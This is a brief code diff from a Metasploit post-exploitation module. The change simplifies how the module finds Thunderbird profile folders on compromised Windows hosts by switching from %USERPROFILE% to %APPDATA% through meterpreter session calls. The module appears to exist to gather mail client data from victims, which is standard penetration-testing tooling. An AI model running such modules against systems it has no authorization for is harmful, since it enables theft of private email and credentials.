@@ -56,18 +56,11 @@ class Metasploit3 < Msf::Post
 			base = "/Users/#{user}/Library/Thunderbird/Profiles/"
 		when /win/
 			if session.type =~ /meterpreter/
-				user_profile = session.fs.file.expand_path("%USERPROFILE%")
+				user_profile = session.fs.file.expand_path("%APPDATA%")
 			else
-				user_profile = cmd_exec("echo %USERPROFILE%").strip
+				user_profile = cmd_exec("echo %APPDATA%").strip
 			end
-
-			if user_profile =~ /^C:\\Users\\/
-				# Windows Vista or newer
-				base = user_profile + '\\AppData\\Roaming\\Thunderbird\\Profiles\\'
-			else
-				# Windows XP
-				base = user_profile + '\\Application Data\\Thunderbird\\Profiles\\'
-			end
+			base = user_profile + "\\Thunderbird\\Profiles\\"
 		end
 
 		# Now we have the path for Thunderbird, we still need to enumerate its
